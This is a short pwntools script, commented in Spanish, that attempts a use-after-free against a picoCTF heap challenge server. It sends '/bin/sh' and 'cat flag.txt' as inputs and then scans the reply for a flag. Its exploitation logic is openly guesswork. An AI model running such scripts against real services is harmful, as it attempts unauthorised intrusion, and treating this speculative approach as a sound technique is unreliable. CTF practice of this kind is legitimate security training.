#!/usr/bin/env python3
from pwn import *

p = remote('jupiter.challenges.picoctf.org', 9521)

# Introducir nombre
p.recvuntil(b'name?')
p.sendline(b'pwner')

# Menú
p.recvuntil(b'>')

# Comprar helado (malloc)
p.sendline(b'1')
p.recvuntil(b'How much?')
p.sendline(b'256')
p.recvuntil(b'Describe')
p.sendline(b'/bin/sh')

# Comer helado (free) - UAF
p.recvuntil(b'>')
p.sendline(b'2')
p.recvuntil(b'Which')
p.sendline(b'0')

# El chunk está libre pero el puntero sigue activo
# Reintroduce nombre - escribe en 0x602040
p.recvuntil(b'>')
p.sendline(b'3')
p.recvuntil(b'name?')

# Intentar escribir dirección de system o comando
# Si el programa imprime el nombre con system() en lugar de printf()...
p.sendline(b'cat flag.txt')

# Ver si imprime algo
p.recvuntil(b'>')
p.sendline(b'4')  # Exit

# Recibir todo
response = p.recvall()
print(response.decode('latin-1'))

# Buscar flag
if b'picoCTF' in response or b'flag' in response:
    print("\n[+] FLAG ENCONTRADA!")
    lines = response.split(b'\n')
    for line in lines:
        if b'pico' in line or b'flag' in line or b'{' in line:
            print(line.decode('latin-1'))